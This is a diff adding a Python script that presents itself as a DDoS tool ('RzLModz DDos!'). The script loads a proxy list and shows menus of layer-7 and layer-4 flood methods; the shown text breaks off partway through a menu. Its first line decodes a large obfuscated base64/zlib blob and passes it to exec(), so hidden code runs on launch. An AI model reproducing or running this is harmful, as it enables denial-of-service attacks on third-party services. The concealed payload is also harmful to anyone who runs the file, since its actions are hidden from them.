@@ -1,3 +1,555 @@
-# Python obfuscation by rzlmodz
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+proxys = open('proxies.txt').readlines()
+bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(f'''
+     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⡂
+⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀
+⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠄⠀⠀⠀⠀⠀⠀
+⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
+⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⡋⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
+⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⡀
+⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠠⠀⠀
+⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⡀⠀⠀⠀
+⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠄⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+
+
+
+
+
+    ''')
+    
+def si():
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRzL \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to RzLModz DDos! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print("")
+    
+def special():
+    clear()
+    si()
+    print(f'''
+                                \x1b[38;2;0;212;14m╔═══════════════╗
+                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
+''')                    
+
+def layer7():
+    clear()
+    si()
+    print(f'''
+                              \x1b[38;2;0;212;14m╔═══════════════╗
+                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mkill            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtryreset         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mmedusa             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-spoof      \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-requests        \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
+''')
+
+def layer4():
+    clear()
+    si()
+    print(f'''
+                              \x1b[38;2;0;212;14m╔═══════════════╗
+                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux                \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mbrutal             \x1b[38;2;0;212;14m║                          
+               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
+''')
+
+def amp_games():
+    clear()
+    si()
+    print(f'''
+                              \x1b[38;2;0;212;14m╔═══════════════╗
+                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
